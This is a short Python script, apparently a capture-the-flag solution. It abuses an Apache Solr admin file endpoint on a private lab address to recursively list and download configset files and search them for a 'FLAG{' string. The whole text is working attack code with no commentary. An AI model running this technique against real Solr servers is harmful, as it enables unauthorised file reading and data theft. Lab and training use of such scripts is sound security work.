import urllib.request, urllib.parse, json
import os

def list_dir(path):
    url = f"http://192.168.5.7:8983/solr/demo/admin/file?file={urllib.parse.quote(path, safe='/')}"
    resp = urllib.request.urlopen(url)
    data = json.load(resp)
    return data.get('files', {})

def find_flag(path):
    entries = list_dir(path)
    for name, info in entries.items():
        entry_path = path.rstrip('/') + '/' + name
        if info.get('directory'):
            result = find_flag(entry_path)
            if result:
                return result
        else:
            url = f"http://192.168.5.7:8983/solr/demo/admin/file?file={urllib.parse.quote(entry_path, safe='/')}"
            try:
                content = urllib.request.urlopen(url).read()
            except Exception:
                continue
            idx = content.find(b'FLAG{')
            if idx != -1:
                return entry_path, content[idx:idx+200].decode('utf-8', errors='ignore')
    return None

result = find_flag('/opt/solr/server/solr/configsets/sample_techproducts_configs/conf')
print(result if result else 'FLAG not found')
